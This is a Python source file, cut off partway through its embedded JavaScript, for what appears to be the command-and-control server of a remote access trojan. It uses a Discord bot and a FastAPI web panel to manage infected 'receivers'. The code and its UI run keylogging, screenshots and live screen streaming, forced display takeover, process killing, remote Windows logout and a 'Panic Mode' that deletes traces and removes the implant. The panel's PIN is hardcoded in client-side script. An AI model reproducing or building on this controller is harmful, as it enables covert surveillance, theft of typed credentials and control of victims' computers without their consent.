# main.py
import asyncio
import importlib
import json
import os
import subprocess
import sys
import tempfile
import secrets
import time
from pathlib import Path
from typing import Optional
from urllib.parse import parse_qs

# ---------------- DEPENDENCIES ----------------
def ensure_dependencies():
    required = {
        "discord": "discord.py",
        "fastapi": "fastapi",
        "uvicorn": "uvicorn",
        "python_multipart": "python-multipart",
    }
    missing = []
    for mod, pkg in required.items():
        try:
            importlib.import_module(mod)
        except ImportError:
            missing.append(pkg)
    if missing:
        subprocess.check_call([sys.executable, "-m", "pip", "install", *missing])

ensure_dependencies()

import discord
from discord.ext import commands
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, UploadFile, File, Form, Request
from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse
from fastapi.staticfiles import StaticFiles

# ---------------- CONFIG ----------------
CONTROLLER_TOKEN = os.getenv("CONTROLLER_TOKEN", "")
COMMAND_CHANNEL_ID = int(os.getenv("COMMAND_CHANNEL_ID", "1360236257212633260"))
TARGET_CHANNEL_ID = int(os.getenv("TARGET_CHANNEL_ID", "0"))
LOG_CHANNEL_ID = int(os.getenv("LOG_CHANNEL_ID", "1457385049845403648"))
BOT_TAG = ""

assert CONTROLLER_TOKEN
assert COMMAND_CHANNEL_ID
assert TARGET_CHANNEL_ID

ROOT_DIR = Path(__file__).parent
SCREENSHOT_DIR = ROOT_DIR / "screenshots"
SCREENSHOT_LOG = ROOT_DIR / "screenshots.json"
_latest_screenshot: dict[str, str] = {"url": "", "message_id": "", "ts": ""}
_latest_keylog: dict[str, str] = {"text": "", "message_id": "", "ts": ""}
_dm_messages: list[str] = []
_latest_dm_user: dict[str, str] = {"id": "", "name": ""}
STATE_FILE = ROOT_DIR / "receivers.json"
_receivers: dict[str, dict] = {}  # id -> {"alias": str, "last_seen": float, "tag": str, "mode": str}
_selected_receiver: Optional[str] = None
STALE_SECONDS = 90
PRUNE_SECONDS = 60 * 60 * 24 * 30
MAX_DM_MESSAGES = 200
DM_REPLY_TEXT = "Meesage Reciever. We Will be with you shortly\n\nThank you for choosing our services <3"
_screenshot_log: list[dict[str, str]] = []

def _load_state():
    global _receivers, _selected_receiver
    if STATE_FILE.is_file():
        try:
            data = json.loads(STATE_FILE.read_text())
            _receivers = data.get("receivers", {})
            _selected_receiver = data.get("selected")
        except Exception:
            pass

def _save_state():
    try:
        STATE_FILE.write_text(json.dumps({"receivers": _receivers, "selected": _selected_receiver}))
    except Exception:
        pass

def _load_screenshot_log():
    global _screenshot_log
    if SCREENSHOT_LOG.is_file():
        try:
            data = json.loads(SCREENSHOT_LOG.read_text())
            if isinstance(data, list):
                _screenshot_log = [item for item in data if isinstance(item, dict)]
        except Exception:
            pass
    try:
        SCREENSHOT_DIR.mkdir(parents=True, exist_ok=True)
    except Exception:
        pass
    if _screenshot_log:
        last = _screenshot_log[-1]
        _latest_screenshot["url"] = str(last.get("url", ""))
        _latest_screenshot["message_id"] = str(last.get("message_id", ""))
        _latest_screenshot["ts"] = str(last.get("ts", ""))

def _save_screenshot_log():
    try:
        SCREENSHOT_LOG.write_text(json.dumps(_screenshot_log))
    except Exception:
        pass

def _prune_receivers(now: Optional[float] = None) -> bool:
    global _selected_receiver
    if now is None:
        now = time.time()
    removed = False
    for rid in list(_receivers.keys()):
        last_seen = _receivers[rid].get("last_seen", 0)
        if now - last_seen > PRUNE_SECONDS:
            _receivers.pop(rid, None)
            removed = True
            if _selected_receiver == rid:
                _selected_receiver = None
    if removed:
        _save_state()
    return removed

def _receiver_status(info: dict, now: Optional[float] = None) -> tuple[str, str, bool]:
    if now is None:
        now = time.time()
    last_seen = info.get("last_seen", 0)
    online = (now - last_seen) <= STALE_SECONDS
    if not online:
        return ("Offline", "offline", False)
    mode = (info.get("mode") or "").lower()
    if mode in ("gif", "gif_display"):
        return ("Gif Display", "gif", True)
    if mode in ("live", "live_view", "stream"):
        return ("Live View", "live", True)
    return ("Online", "online", True)

def _set_receiver_mode(rid: Optional[str], mode: str):
    if not rid:
        return
    info = _receivers.get(rid)
    if not info:
        return
    if mode:
        info["mode"] = mode
    else:
        info.pop("mode", None)
    _save_state()

async def _store_screenshot_attachment(
    att: discord.Attachment,
    message: discord.Message,
    index: int,
) -> Optional[dict[str, str]]:
    name = (att.filename or "").lower()
    if not name.endswith((".png", ".jpg", ".jpeg")):
        return None
    ext = Path(name).suffix.lower()
    if ext not in (".png", ".jpg", ".jpeg"):
        ext = ".png"
    filename = f"{message.id}_{index}{ext}"
    target = SCREENSHOT_DIR / filename
    try:
        data = await att.read()
    except Exception as e:
        print("Failed to read screenshot attachment:", e)
        return None
    try:
        target.write_bytes(data)
    except Exception as e:
        print("Failed to save screenshot:", e)
        return None
    entry = {
        "id": filename,
        "url": f"/screenshots/{filename}",
        "message_id": str(message.id),
        "ts": str(message.created_at),
    }
    _screenshot_log.append(entry)
    _save_screenshot_log()
    return entry

_load_state()
_load_screenshot_log()

# ---------------- DISCORD ----------------
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="?", intents=intents)
_controller_ready = asyncio.Event()
_controller_error: Optional[str] = None

async def _get_channel(cid: int) -> discord.TextChannel:
    ch = bot.get_channel(cid)
    return ch or await bot.fetch_channel(cid)

@bot.event
async def on_ready():
    print(f"[SERVER] Logged in as {bot.user}")
    _controller_ready.set()

@bot.event
async def on_message(message: discord.Message):
    # Track DMs (non-commands)
    if message.guild is None and not message.author.bot:
        content = (message.content or "").strip()
        prefix = bot.command_prefix
        prefixes: tuple[str, ...] = ()
        if isinstance(prefix, str):
            prefixes = (prefix,)
        elif isinstance(prefix, (list, tuple, set)):
            prefixes = tuple(str(p) for p in prefix)
        is_command = content and prefixes and any(content.startswith(p) for p in prefixes if p)
        if content and not is_command:
            timestamp = message.created_at.strftime("%Y-%m-%d %H:%M:%S")
            username = message.author.name or str(message.author)
            line = f"{timestamp} - {username}: {content}"
            _dm_messages.append(line)
            if len(_dm_messages) > MAX_DM_MESSAGES:
                _dm_messages.pop(0)
            _latest_dm_user["id"] = str(message.author.id)
            _latest_dm_user["name"] = username
    # Track latest screenshot posted by receiver
    if message.channel.id == TARGET_CHANNEL_ID and message.attachments:
        for idx, att in enumerate(message.attachments):
            entry = await _store_screenshot_attachment(att, message, idx)
            if entry:
                _latest_screenshot["url"] = entry["url"]
                _latest_screenshot["message_id"] = entry["message_id"]
                _latest_screenshot["ts"] = entry["ts"]
    # Track latest key logs posted by receiver
    if message.channel.id == LOG_CHANNEL_ID and message.content:
        text = (message.content or "").strip()
        if text.startswith("```") and text.endswith("```"):
            inner = text[3:-3]
            if inner.startswith("\n"):
                text = inner[1:]
            elif "\n" in inner:
                text = inner.split("\n", 1)[1]
            else:
                text = inner
        _latest_keylog["text"] = text
        _latest_keylog["message_id"] = str(message.id)
        _latest_keylog["ts"] = str(message.created_at)
    # Track receiver announcements
    if message.channel.id == COMMAND_CHANNEL_ID:
        content = (message.content or "").strip()
        if not content:
            return
        tokens = content.split()
        # Drop optional BOT_TAG for backward compatibility
        if BOT_TAG and tokens and tokens[0] == BOT_TAG:
            tokens = tokens[1:]
        if tokens and tokens[0] in ("ONLINE", "PING") and len(tokens) >= 3:
            receiver_id = tokens[1].strip()
            tag = tokens[2].strip()
            now = time.time()
            entry = _receivers.get(receiver_id, {"alias": "", "tag": tag, "last_seen": now, "mode": ""})
            entry.setdefault("alias", "")
            entry.setdefault("mode", "")
            entry["tag"] = tag
            entry["last_seen"] = now
            _receivers[receiver_id] = entry
            if _selected_receiver is None:
                _selected_receiver = receiver_id
            _save_state()
# ---------------- WEBSOCKET HUB ----------------
class Hub:
    def __init__(self):
        self.clients: set[WebSocket] = set()
        self.lock = asyncio.Lock()

    async def add(self, ws: WebSocket):
        async with self.lock:
            self.clients.add(ws)

    async def remove(self, ws: WebSocket):
        async with self.lock:
            self.clients.discard(ws)


    async def broadcast_bytes(self, data: bytes, *, sender: Optional[WebSocket] = None):
        dead = []
        async with self.lock:
            for ws in list(self.clients):
                if sender is not None and ws is sender:
                    continue
                try:
                    await ws.send_bytes(data)
                except Exception:
                    dead.append(ws)
            for ws in dead:
                self.clients.discard(ws)

hub = Hub()

class LiveHub:
    def __init__(self):
        self.viewers: set[WebSocket] = set()
        self.lock = asyncio.Lock()
        self.latest: Optional[bytes] = None

    async def add_viewer(self, ws: WebSocket):
        async with self.lock:
            self.viewers.add(ws)

    async def remove_viewer(self, ws: WebSocket):
        async with self.lock:
            self.viewers.discard(ws)

    async def broadcast(self, data: bytes):
        self.latest = data
        dead = []
        async with self.lock:
            for ws in list(self.viewers):
                try:
                    await ws.send_bytes(data)
                except Exception:
                    dead.append(ws)
            for ws in dead:
                self.viewers.discard(ws)

_live_hubs: dict[str, LiveHub] = {}

# ---------------- FASTAPI ----------------
app = FastAPI(title="Controller")
SCREENSHOT_DIR.mkdir(parents=True, exist_ok=True)
app.mount("/screenshots", StaticFiles(directory=str(SCREENSHOT_DIR)), name="screenshots")

CONTROL_HTML = """<!doctype html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Controller</title>
  <style>
    :root { --bg:#07030f; --card:#0e0a1a; --border:#21183a; --accent:#9b5cff; --accent2:#6b21ff; --text:#e7e7ff; --muted:#b8b5d3; --danger:#ef4444; --success:#22c55e; }
    body { font-family: 'Segoe UI', sans-serif; background-color: var(--bg); background-image: radial-gradient(circle at 20% 20%, rgba(107,33,255,0.18), transparent 28%), radial-gradient(circle at 80% 0%, rgba(155,92,255,0.18), transparent 28%), linear-gradient(135deg, rgba(155,92,255,0.08), rgba(107,33,255,0.05)); background-repeat: no-repeat; background-attachment: fixed; background-size: cover; background-position: center; color: var(--text); margin: 0; padding: 24px; min-height: 100vh; }
    .layout { display: grid; grid-template-columns: minmax(320px, 1fr); gap: 16px; align-items: start; }
    .card { background: linear-gradient(145deg, rgba(14,10,26,0.94), rgba(18,14,30,0.97)); border: 1px solid var(--border); border-radius: 14px; padding: 18px; box-shadow: 0 10px 35px rgba(0,0,0,0.35); }
    h1 { margin: 0 0 12px; font-size: 18px; letter-spacing: 0.3px; }
    label { display: block; margin-bottom: 6px; color: var(--muted); font-size: 13px; }
    input, button { font-family: inherit; }
    input[type=file], input[type=text], input[type=number] { width: 100%; margin-bottom: 10px; padding: 10px; border-radius: 10px; border: 1px solid var(--border); background: #0c0817; color: var(--text); }
    button { cursor: pointer; background: linear-gradient(135deg, var(--accent), var(--accent2)); color: #0b0419; border: none; border-radius: 10px; padding: 10px 14px; font-weight: 700; letter-spacing: 0.3px; }
    button.secondary { background: #180f2c; color: var(--text); border: 1px solid var(--border); }
    .row { display: flex; gap: 10px; align-items: center; flex-wrap: wrap; }
    small { color: var(--muted); }
    img { max-width: 100%; border-radius: 10px; border: 1px solid var(--border); }
    .pill { padding: 8px 12px; border-radius: 999px; border: 1px solid var(--border); background: #0c0817; }
    .tabs { display: flex; gap: 8px; margin-bottom: 12px; flex-wrap: wrap; }
    .tab-btn { background: #140c24; color: var(--muted); border: 1px solid var(--border); padding: 8px 12px; border-radius: 8px; cursor: pointer; }
    .tab-btn.active { background: linear-gradient(135deg, var(--accent), var(--accent2)); color: #0b0419; border-color: transparent; }
    .tab-pane { display: none; }
    .tab-pane.active { display: block; }
    .receiver-row { display: flex; gap: 10px; align-items: center; flex-wrap: wrap; }
    .receiver-list { display: grid; gap: 12px; }
    .receiver-item { display: grid; grid-template-columns: 1fr auto; gap: 12px; align-items: center; padding: 12px; border: 1px solid var(--border); border-radius: 12px; background: #0c0817; }
    .receiver-item.selected { border-color: rgba(155,92,255,0.7); box-shadow: 0 0 0 1px rgba(155,92,255,0.4); }
    .receiver-info { display: flex; flex-direction: column; gap: 6px; }
    .receiver-title { display: flex; gap: 8px; align-items: center; flex-wrap: wrap; }
    .receiver-name { font-weight: 700; letter-spacing: 0.2px; }
    .receiver-meta { display: flex; gap: 8px; flex-wrap: wrap; align-items: center; font-size: 12px; color: var(--muted); }
    .status-pill { padding: 4px 8px; border-radius: 999px; font-size: 10px; text-transform: uppercase; letter-spacing: 0.6px; border: 1px solid var(--border); background: #120a22; }
    .status-online { border-color: rgba(34,197,94,0.5); color: #86efac; background: rgba(34,197,94,0.12); }
    .status-offline { border-color: rgba(239,68,68,0.45); color: #fecaca; background: rgba(239,68,68,0.12); }
    .status-gif { border-color: rgba(251,146,60,0.45); color: #fdba74; background: rgba(251,146,60,0.12); }
    .status-live { border-color: rgba(56,189,248,0.45); color: #7dd3fc; background: rgba(56,189,248,0.12); }
    .receiver-actions { display: flex; gap: 8px; flex-wrap: wrap; justify-content: flex-end; }
    .receiver-actions form { margin: 0; }
    .receiver-id { opacity: 0.8; }
    .receiver-summary { margin: 0 0 10px; color: var(--muted); font-size: 12px; }
    .receiver-empty { padding: 12px; border: 1px dashed var(--border); border-radius: 12px; color: var(--muted); }
    .shot-list { display: grid; gap: 10px; margin-top: 12px; }
    .shot-item { border: 1px solid var(--border); border-radius: 12px; background: #0c0817; padding: 10px; }
    .shot-summary { display: grid; grid-template-columns: auto 1fr; gap: 10px; align-items: center; cursor: pointer; list-style: none; }
    .shot-summary::-webkit-details-marker { display: none; }
    .shot-thumb { width: 72px; height: 54px; object-fit: cover; border-radius: 8px; border: 1px solid var(--border); }
    .shot-time { font-size: 12px; color: var(--muted); }
    .shot-full { margin-top: 10px; width: 100%; border-radius: 10px; border: 1px solid var(--border); }
    .live-wrap { margin-top: 12px; padding: 10px; border: 1px solid var(--border); border-radius: 12px; background: #0b0716; }
    .live-img { width: 100%; display: block; border-radius: 10px; border: 1px solid var(--border); background: #05030b; }
    .live-status { margin-left: auto; }
    .rename-section { margin-top: 16px; padding: 12px; border: 1px solid var(--border); border-radius: 12px; background: #0c0817; }
    .rename-section h2 { margin: 0 0 10px; font-size: 14px; letter-spacing: 0.3px; }
    .rename-grid { display: grid; grid-template-columns: minmax(160px, 1fr) minmax(200px, 2fr) auto; gap: 10px; align-items: center; }
    .rename-select { width: 100%; padding: 10px; border-radius: 10px; border: 1px solid var(--border); background: #0c0817; color: var(--text); }
    .rename-input { width: 180px; min-width: 140px; margin-bottom: 0; }
    .panic-btn { position: fixed; right: 24px; bottom: 24px; z-index: 999; background: linear-gradient(135deg, #f97316, var(--danger)); color: #0b0419; box-shadow: 0 12px 24px rgba(239,68,68,0.35); }
    .panic-btn:active { transform: translateY(1px); }
    .locked .app { pointer-events: none; filter: blur(1px); }
    .pin-overlay { position: fixed; inset: 0; display: flex; align-items: center; justify-content: center; background: radial-gradient(circle at 20% 20%, rgba(155,92,255,0.16), transparent 45%), rgba(7,3,15,0.95); z-index: 1200; }
    .pin-card { width: min(360px, 90vw); background: linear-gradient(145deg, rgba(14,10,26,0.96), rgba(18,14,30,0.99)); border: 1px solid var(--border); border-radius: 14px; padding: 18px; box-shadow: 0 12px 36px rgba(0,0,0,0.4); }
  </style>
</head>
<body class="locked">
  <div class="app">
  <div class="layout">
    <div class="card">
      <div class="tabs">
        <button class="tab-btn active" data-tab="surprise">Take Over</button>
        <button class="tab-btn" data-tab="select">Select Target</button>
        <button class="tab-btn" data-tab="openclose">Open & Close :3</button>
        <button class="tab-btn" data-tab="volume">Volume ;0</button>
        <button class="tab-btn" data-tab="screen">Screen</button>
        <button class="tab-btn" data-tab="logs">Logs</button>
        <button class="tab-btn" data-tab="messages">Messages</button>
        <button class="tab-btn" data-tab="remotes">remote's</button>
      </div>
      <div class="tab-pane active" data-tab="surprise">
        <h1>Take Over</h1>
        <p style="margin: 4px 0 12px; color:var(--muted);">Sends local <code>M.gif</code> and <code>sound.mp3</code> to the receiver and triggers display.</p>
        <div class="row">
          <form method="post" action="/ui/surprise">
            <button type="submit">Send & Display</button>
          </form>
          <form method="post" action="/ui/gif/stop">
            <button class="secondary" type="submit">Stop Display</button>
          </form>
        </div>
      </div>
      <div class="tab-pane" data-tab="select">
        <h1>Select Target</h1>
        <div id="receiver-summary" class="receiver-summary"></div>
        <div id="receiver-list" class="receiver-list"></div>
        <div class="rename-section">
          <h2>Rename Display</h2>
          <form id="rename-form" method="post" action="/ui/rename/">
            <div class="rename-grid">
              <select id="rename-target" name="rid" class="rename-select"></select>
              <input id="rename-alias" class="rename-input" name="alias" type="text" placeholder="New display name">
              <button class="secondary" type="submit">Save Name</button>
            </div>
          </form>
        </div>
      </div>
      <div class="tab-pane" data-tab="openclose">
        <h1>Open & Close :3</h1>
        <form method="post" action="/ui/open">
          <label for="url">Open website</label>
          <input id="url" name="url" type="text" placeholder="https://google.com" required>
          <button type="submit">Open</button>
        </form>
        <form method="post" action="/ui/close" style="margin-top:12px;">
          <label for="proc">Close process (name.exe)</label>
          <input id="proc" name="proc" type="text" placeholder="chrome.exe" required>
          <button class="secondary" type="submit">Close</button>
        </form>
      </div>
      <div class="tab-pane" data-tab="volume">
        <h1>Volume ;0</h1>
        <form method="post" action="/ui/volume">
          <label for="level">Set volume (0-100)</label>
          <input id="level" name="level" type="number" min="0" max="100" step="1" value="50" required>
          <button type="submit">Set Volume</button>
        </form>
      </div>
      <div class="tab-pane" data-tab="screen">
        <h1>Screen</h1>
        <p style="color:var(--muted); margin-bottom:12px;">
          Capture a screenshot on the selected receiver and keep a log here.
        </p>
        <div class="row">
          <form method="post" action="/ui/live/start">
            <button type="submit">Start Live</button>
          </form>
          <form method="post" action="/ui/live/stop">
            <button type="submit" class="secondary">Stop Live</button>
          </form>
          <span id="live-status" class="pill live-status">Live: off</span>
        </div>
        <div class="live-wrap">
          <img id="live-img" class="live-img" alt="Live view">
        </div>
        <div class="row">
          <form method="post" action="/ui/screenshot">
            <button type="submit">Take Screenshot</button>
          </form>
        </div>
        <div id="screenshot-list" class="shot-list"></div>
        <div id="screenshot-empty" class="receiver-empty" style="display:none;">No screenshots yet.</div>
      </div>
      <div class="tab-pane" data-tab="logs">
        <h1>Key Logs</h1>
        <p style="color:var(--muted); margin-bottom:12px;">
          Start / stop key logging on the selected receiver.
          Logged keys auto-expire after 60 seconds.
        </p>

        <div class="row">
          <form method="post" action="/ui/logs/start">
            <button type="submit">Start Logging</button>
          </form>

          <form method="post" action="/ui/logs/stop">
            <button class="secondary" type="submit">Stop Logging</button>
          </form>
        </div>

        <pre id="log-output" style="
          margin-top:12px;
          padding:12px;
          background:#0c0817;
          border:1px solid var(--border);
          border-radius:10px;
          max-height:260px;
          overflow:auto;
          font-size:13px;
        ">Waiting for logs…</pre>
      </div>
      <div class="tab-pane" data-tab="messages">
        <h1>Messages</h1>
        <p style="color:var(--muted); margin-bottom:12px;">
          DMs received by the bot (non-commands).
        </p>
        <div class="row">
          <form method="post" action="/ui/messages/reply">
            <button type="submit">Reply Latest DM</button>
          </form>
        </div>
        <pre id="message-output" style="
          margin-top:12px;
          padding:12px;
          background:#0c0817;
          border:1px solid var(--border);
          border-radius:10px;
          max-height:260px;
          overflow:auto;
          font-size:13px;
        ">Waiting for messages...</pre>
      </div>
      <div class="tab-pane" data-tab="remotes">
        <h1>Remote's</h1>
        <p style="color:var(--muted); margin-bottom:12px;">
          Log out the current Windows session on the selected receiver.
        </p>
        <form method="post" action="/ui/logout">
          <button class="secondary" type="submit">Log Out</button>
        </form>
      </div>
    </div>
  </div>
  <button id="panic-btn" class="panic-btn" type="button">Panic Mode</button>
  </div>
  <div id="pin-overlay" class="pin-overlay">
    <div class="pin-card">
      <h1>Enter PIN</h1>
      <p style="margin: 4px 0 12px; color:var(--muted);">PIN required to access controls.</p>
      <form id="pin-form">
        <input id="pin-input" type="password" inputmode="numeric" autocomplete="off" placeholder="PIN" required>
        <button type="submit">Unlock</button>
      </form>
      <small id="pin-error" style="color:#f97316;"></small>
    </div>
  </div>
  <script>
    const REQUIRED_PIN = "05701842";
    const pinOverlay = document.getElementById('pin-overlay');
    const pinForm = document.getElementById('pin-form');
    const pinInput = document.getElementById('pin-input');
    const pinError = document.getElementById('pin-error');
    function unlockUI() {
      document.body.classList.remove('locked');
      if (pinOverlay) pinOverlay.style.display = 'none';
    }
    if (pinForm) {
      pinForm.addEventListener('submit', (e) => {
        e.preventDefault();
        if (pinInput && pinInput.value === REQUIRED_PIN) {
          pinError.textContent = '';
          pinInput.value = '';
          unlockUI();
          return;
        }
        if (pinError) pinError.textContent = 'Incorrect PIN';
        if (pinInput) {
          pinInput.value = '';
          pinInput.focus();
        }
      });
    }
    window.addEventListener('load', () => {
      if (pinInput) pinInput.focus();
    });
    let selectedReceiver = null;
    let liveSocket = null;
    let liveWanted = false;
    let liveTarget = null;
    const liveImg = document.getElementById('live-img');
    const liveStatus = document.getElementById('live-status');
    let lastReceiverList = [];
    const renameForm = document.getElementById('rename-form');
    const renameSelect = document.getElementById('rename-target');
    const renameInput = document.getElementById('rename-alias');

    function updateRenameSection(rec) {
      if (!renameForm || !renameSelect || !renameInput) return;
      if (!rec) {
        renameForm.action = '/ui/rename/';
        renameInput.placeholder = 'No receiver selected';
        if (document.activeElement !== renameInput) {
          renameInput.value = '';
        }
        renameForm.querySelector('button').disabled = true;
        return;
      }
      renameForm.action = '/ui/rename/' + encodeURIComponent(rec.id);
      renameForm.querySelector('button').disabled = false;
      if (document.activeElement !== renameInput) {
        renameInput.value = rec.alias || '';
        renameInput.placeholder = rec.name || rec.tag || rec.id;
      }
    }

    if (renameSelect) {
      renameSelect.addEventListener('change', () => {
        const rid = renameSelect.value;
        const rec = lastReceiverList.find(item => item.id === rid);
        updateRenameSection(rec);
      });
    }

    function setLiveStatus(text) {
      if (liveStatus) liveStatus.textContent = text;
    }

    function buildLiveUrl(rid) {
      const scheme = location.protocol === 'https:' ? 'wss' : 'ws';
      return `${scheme}://${location.host}/live/${encodeURIComponent(rid)}?role=viewer`;
    }

    function startLiveView() {
      liveWanted = true;
      if (!selectedReceiver) {
        setLiveStatus('Live: select receiver');
        return;
      }
      const url = buildLiveUrl(selectedReceiver);
      if (liveSocket && liveSocket.readyState <= 1 && liveTarget === url) {
        return;
      }
      stopLiveView(false);
      liveTarget = url;
      liveSocket = new WebSocket(url);
      liveSocket.binaryType = 'arraybuffer';
      setLiveStatus('Live: connecting');
      liveSocket.onopen = () => setLiveStatus('Live: connected');
      liveSocket.onerror = () => setLiveStatus('Live: error');
      liveSocket.onclose = () => {
        setLiveStatus(liveWanted ? 'Live: disconnected' : 'Live: off');
      };
      liveSocket.onmessage = (event) => {
        if (!liveImg) return;
        const blob = new Blob([event.data], { type: 'image/jpeg' });
        const obj = URL.createObjectURL(blob);
        if (liveImg.dataset.lastUrl) {
          URL.revokeObjectURL(liveImg.dataset.lastUrl);
        }
        liveImg.dataset.lastUrl = obj;
        liveImg.src = obj;
      };
    }

    function stopLiveView(setOff = true) {
      if (setOff) liveWanted = false;
      if (liveSocket) {
        try { liveSocket.close(); } catch (e) { /* ignore */ }
      }
      liveSocket = null;
      liveTarget = null;
      if (liveImg) {
        if (liveImg.dataset.lastUrl) {
          URL.revokeObjectURL(liveImg.dataset.lastUrl);
          delete liveImg.dataset.lastUrl;
        }
        liveImg.removeAttribute('src');
      }
      if (setOff) setLiveStatus('Live: off');
    }
    async function refreshReceivers() {
      try {
        const res = await fetch('/api/receivers');
        if (!res.ok) return;
        const data = await res.json();
        selectedReceiver = data.selected || null;
        const wrap = document.getElementById('receiver-list');
        const summary = document.getElementById('receiver-summary');
        if (!wrap) return;
        wrap.innerHTML = '';
        const online = data.online || [];
        const offline = data.offline || [];
        lastReceiverList = online.concat(offline);
        if (summary) {
          summary.textContent = `${online.length} online | ${offline.length} offline`;
        }
        if (!lastReceiverList.length) {
          const empty = document.createElement('div');
          empty.className = 'receiver-empty';
          empty.textContent = 'No receivers yet. Open a receiver to appear here.';
          wrap.appendChild(empty);
        }
        lastReceiverList.forEach(rec => {
          const item = document.createElement('div');
          item.className = 'receiver-item';
          if (data.selected === rec.id) {
            item.classList.add('selected');
          }

          const info = document.createElement('div');
          info.className = 'receiver-info';

          const status = document.createElement('span');
          const statusKey = rec.status_key || (rec.online ? 'online' : 'offline');
          status.className = 'status-pill status-' + statusKey;
          status.textContent = rec.status || (rec.online ? 'Online' : 'Offline');

          const title = document.createElement('div');
          title.className = 'receiver-title';
          const name = document.createElement('div');
          name.className = 'receiver-name';
          name.textContent = rec.name || rec.tag || rec.id;
          title.appendChild(name);
          title.appendChild(status);

          const meta = document.createElement('div');
          meta.className = 'receiver-meta';
          const idSpan = document.createElement('span');
          idSpan.className = 'receiver-id';
          idSpan.textContent = rec.tag ? ('Tag: ' + rec.tag) : ('ID: ' + rec.id);

          meta.appendChild(idSpan);
          info.appendChild(title);
          info.appendChild(meta);

          const actions = document.createElement('div');
          actions.className = 'receiver-actions';

          const selectForm = document.createElement('form');
          selectForm.method = 'post';
          selectForm.action = '/ui/select/' + encodeURIComponent(rec.id);
          wireForm(selectForm);
          const btn = document.createElement('button');
          btn.type = 'submit';
          btn.textContent = data.selected === rec.id ? 'Selected' : 'Select';
          if (!rec.online) {
            btn.className = 'secondary';
          }
          if (data.selected === rec.id) {
            btn.style.background = '#10b981';
            btn.style.color = '#0b1224';
          }
          selectForm.appendChild(btn);

          actions.appendChild(selectForm);

          item.appendChild(info);
          item.appendChild(actions);
          wrap.appendChild(item);
        });
        if (renameSelect) {
          const current = renameSelect.value;
          renameSelect.innerHTML = '';
          if (!lastReceiverList.length) {
            const option = document.createElement('option');
            option.textContent = 'No receivers';
            option.value = '';
            renameSelect.appendChild(option);
            updateRenameSection(null);
          } else {
            lastReceiverList.forEach(rec => {
              const opt = document.createElement('option');
              opt.value = rec.id;
              opt.textContent = `${rec.name || rec.tag || rec.id} - ${rec.status || (rec.online ? 'Online' : 'Offline')}`;
              if (rec.id === current || (!current && rec.id === selectedReceiver)) {
                opt.selected = true;
              }
              renameSelect.appendChild(opt);
            });
            const targetId = renameSelect.value || selectedReceiver;
            const targetRec = lastReceiverList.find(item => item.id === targetId);
            updateRenameSection(targetRec);
          }
        }
        const panicBtn = document.getElementById('panic-btn');
        if (panicBtn) {
          panicBtn.disabled = !selectedReceiver;
        }
        if (liveWanted) {
          startLiveView();
        }
      } catch (e) { /* ignore */ }
    }
    async function refreshScreenshots() {
      try {
        const list = document.getElementById('screenshot-list');
        const empty = document.getElementById('screenshot-empty');
        if (!list) return;
        const res = await fetch('/api/screenshots');
        if (!res.ok) return;
        const data = await res.json();
        const items = data.items || [];
        list.innerHTML = '';
        if (empty) {
          empty.style.display = items.length ? 'none' : 'block';
        }
        items.forEach(item => {
          const details = document.createElement('details');
          details.className = 'shot-item';

          const summary = document.createElement('summary');
          summary.className = 'shot-summary';

          const thumb = document.createElement('img');
          thumb.className = 'shot-thumb';
          thumb.src = item.url;
          thumb.alt = 'Screenshot thumbnail';

          const meta = document.createElement('div');
          const time = document.createElement('div');
          time.className = 'shot-time';
          time.textContent = item.ts || 'Screenshot';
          meta.appendChild(time);

          summary.appendChild(thumb);
          summary.appendChild(meta);
          details.appendChild(summary);

          const full = document.createElement('img');
          full.className = 'shot-full';
          full.src = item.url;
          full.alt = 'Screenshot';
          details.appendChild(full);

          list.appendChild(details);
        });
      } catch (e) { /* ignore */ }
    }
    async function refreshLogs() {
      try {
        const output = document.getElementById('log-output');
        if (!output) return;
        const res = await fetch('/api/logs');
        if (!res.ok) return;
        const data = await res.json();
        if (data.text) {
          output.textContent = data.text;
        }
      } catch (e) { /* ignore */ }
    }
    async function refreshMessages() {
      try {
        const output = document.getElementById('message-output');
        if (!output) return;
        const res = await fetch('/api/messages');
        if (!res.ok) return;
        const data = await res.json();
        output.textContent = data.text || 'Waiting for messages...';
      } catch (e) { /* ignore */ }
    }
    async function submitFormNoReload(form) {
      const method = (form.method || 'post').toUpperCase();
      const data = new URLSearchParams(new FormData(form));
      try {
        const res = await fetch(form.action, {
          method,
          body: data,
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-Requested-With': 'fetch',
          },
        });
        if (!(res.status >= 200 && res.status < 400)) {
          alert('Request failed.');
          return false;
        }
        return true;
      } catch (e) {
        alert('Request failed.');
        return false;
      }
    }
    function wireForm(form) {
      if (!form || form.dataset.ajaxBound) return;
      form.dataset.ajaxBound = '1';
      form.addEventListener('submit', async (e) => {
        e.preventDefault();
        const ok = await submitFormNoReload(form);
        if (!ok) return;
        if (form.action.includes('/ui/rename') || form.action.includes('/ui/select')) {
          refreshReceivers();
        }
        if (form.action.includes('/ui/screenshot')) {
          setTimeout(refreshScreenshots, 2000);
        }
        if (form.action.includes('/ui/live/start')) {
          startLiveView();
        }
        if (form.action.includes('/ui/live/stop')) {
          stopLiveView();
        }
      });
    }
    // tabs
    const tabButtons = document.querySelectorAll('.tab-btn');
    const tabPanes = document.querySelectorAll('.tab-pane');
    function activateTab(id) {
      tabButtons.forEach(btn => btn.classList.toggle('active', btn.dataset.tab === id));
      tabPanes.forEach(pane => pane.classList.toggle('active', pane.dataset.tab === id));
    }
    tabButtons.forEach(btn => btn.addEventListener('click', () => activateTab(btn.dataset.tab)));

    activateTab('surprise');
    refreshReceivers();
    refreshScreenshots();
    refreshLogs();
    refreshMessages();
    setInterval(refreshReceivers, 5000);
    setInterval(refreshScreenshots, 6000);
    setInterval(refreshLogs, 5000);
    setInterval(refreshMessages, 5000);

    document.querySelectorAll('.app form').forEach(form => {
      if (form.id === 'pin-form') return;
      wireForm(form);
    });

    const panicBtn = document.getElementById('panic-btn');
    if (panicBtn) {
      panicBtn.addEventListener('click', async () => {
        if (!selectedReceiver) {
          alert('Select a receiver first.');
          return;
        }
        const ok = confirm('Panic mode will delete downloaded files and remove the receiver app. Continue?');
        if (!ok) return;
        try {
          const res = await fetch('/ui/panic', { method: 'POST' });
          if (!res.ok) {
            alert('Panic request failed.');
            return;
          }
          alert('Panic request sent.');
          refreshReceivers();
        } catch (e) {
